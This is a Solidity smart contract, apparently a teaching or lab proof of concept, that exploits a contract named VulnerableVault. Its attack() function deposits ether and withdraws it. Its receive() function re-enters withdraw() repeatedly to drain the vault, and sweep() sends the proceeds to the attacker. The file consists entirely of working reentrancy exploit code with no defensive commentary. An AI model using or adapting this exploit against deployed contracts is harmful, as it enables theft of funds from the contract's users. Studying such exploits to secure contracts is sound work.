// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VulnerableVault} from "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public immutable vault;
    address public immutable owner;

    constructor(address vault_) {
        vault = VulnerableVault(vault_);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "send some ETH to attack with");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw();
        }
    }

    function sweep() external {
        require(msg.sender == owner, "only owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
